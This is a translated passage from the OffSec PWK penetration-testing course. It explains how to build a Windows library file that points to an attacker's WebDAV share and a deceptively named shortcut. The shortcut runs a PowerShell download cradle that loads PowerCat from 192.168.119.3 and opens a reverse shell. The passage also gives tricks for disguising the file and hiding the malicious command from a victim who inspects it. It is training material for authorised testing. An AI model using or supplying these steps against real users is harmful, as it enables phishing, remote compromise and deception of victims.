
# OffSec 架构

## Kali Linux 渗透测试

库描述（Library Description）521 更多信息请参阅。我们将从添加 XML 和库文件的格式版本开始。

下方的列表包含了库文件的命名空间（namespace）522。这是从 Windows 7 开始的库文件版本的命名空间。列表还包含了库描述的结束标签。以下所有内容都将添加到 `libraryDescription`523 标签内部。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">

</libraryDescription>
```

列表 222 - XML 和库描述版本

接下来，我们将添加两个提供库的信息。`name`524 标签指定此库的名称。我们不能将其与可以随机定义的属性名称混淆。我们需要通过提供 DLL 和索引来指定库的名称。我们可以按照微软网站上的指定，使用 `#shell32.dll,-34575` 或 `@windows.storage.dll,-34582`。我们将使用后者，以避免可能标记“shell32”的文本过滤器产生任何问题。`version`525 标签可以设置为你任选的数值，例如：

```xml
<name>@windows.storage.dll,-34582</name>
<version>6</version>
```

列表 223 - 库的名称和版本标签

接下来，我们将添加库的 `isLibraryPinned`。此元素指定库是否被固定在 Windows 资源管理器的导航窗格中。对于我们的目标来说，这可能是让整个过程看起来更真实的另一个小细节，因此我们将将其设置为 `true`。我们将添加的下一个标签是 `iconReference`527，用于识别库文件。我们必须以与元素名相同的格式指定值。我们可以使用 `imagesres.dll` 在所有 Windows 图标中进行选择。我们可以使用“1002”作为文档文件夹或图片文件夹图标。我们将提供后者以使其看起来更良性。

```xml
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imagesres.dll,-3603</iconReference>
```

列表 224 - 导航栏固定和图标配置

现在，让我们添加 `templateinfo`528，它包含 `folderType`529。这些标签决定了在打开 之后，Windows 资源管理器中显示的列和详细信息

> 521 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/windows/win32/shell-library-schema

522 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/windows/win32/shell-library-entry-namespace-versioning

523 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/shell-library-description

524 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/shell-library-name

525 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/shell-library-version

526 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/shell-library-ispinned

527 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/shell-library-icon-reference

528 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/shell-library-templateinfo

529 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/shell-library-foldertype

PWK - Copyright © 2023 OffSec Limited

## OffSec

使用 Kali Linux 进行渗透测试

太棒了！

作为一个额外的奖励，导航栏中的路径显示为 `config`，而没有任何迹象表明这实际上是一个远程位置。这使得它成为我们客户端攻击的完美第一阶段。

当我们在 Visual Studio Code 中重新打开文件时，我们发现了一个名为 `serialized` 的新标签 538。该标签包含了关于 `url` 标签位置的 base64 编码信息。此外，`url` 标签的内容已从 `192.168.119.2` 变为 `\192.168.119.2\WWWroot`。Windows 尝试为 Windows WebDAV 客户端^{539} 优化 WebDAV 连接并对其修改。

![](img/987dc9f6ebd8893c565a1d124d7724e6_344_0.png)

图 192：修改后的 config.Library XML 代码

当我们双击该库文件时，它仍然有效，但由于 *serialized* 标签中的编码信息，它在其他机器上或重启后可能无法运行。这可能会导致我们的客户端攻击失败，因为 Windows 资源管理器器空的 WebDAV 共享。

为了避免执行此攻击时出现任何问题，我们可以通过将列表 227 的内容粘贴到 Visual Studio Code 将文件重置为原始状态。遗憾的是，每次执行 Windows 库文件都需要这样做。然而，在大多数评估中这不是大问题，因为我们只需要双击文件一次。一旦文件恢复原始状态，我们就可以将文件发送给受害者。

现在我们有了一个可以工作的 Windows 库文件，我们需要创建一个快捷方式。目标是通过将 `.lnk` 快捷方式推送到 WebDAV 让受害者执行，从而启动反向 shell。

> 538 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/search/search-schema-conn-simplelocation

> 539 (WebDAV SYSTEM, 2022), https://www.webdavsystem.com/server/access/windows

PWK - Copyright © 2023 OffSec Services Limited. 版权所有。

345 制于摩洛哥

## OffSec

让我们为 offsec 用户创建快捷方式。为此，我们在桌上右键并点击“新建”，然后点击“快捷方式”。在“创建快捷方式”窗口中，我们可以输入带有参数的程序路径，这将指向快捷方式。我们将快捷方式指向 PowerShell 并使用另一个下载载体（cradle）从我们的 Kali 机器加载 PowerCat 并启动反向 shell。

我们将使用之前用过的命令：

```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
powercat -c 192.168.119.3 -p 4444 -e powershell"
```

列表 228 - PowerShell 下载载体和 PowerCat 反向 shell 执行

我们将此命令输入输入框并点击“下一步”。

![](img/987dc9f6ebd8893c565a1d124d7724e6_345_0.png)

图 193：在 CLIENT137 上创建快捷方式

如果我们预计受害者足够技术，会检查快捷方式文件指向哪里，我们可以使用一个方便的小技巧。由于我们的命令看起来非常可疑，我们可以在后面加一个分隔符和一个良性命令，从而将恶意命令推到文件属性菜单的可视区域之外。如果用户想检查快捷方式，他们只会看到良性命令。

在下一个窗口中，让我们将快捷方式文件命名为 automatic_configuration，并点击“完成”创建它。
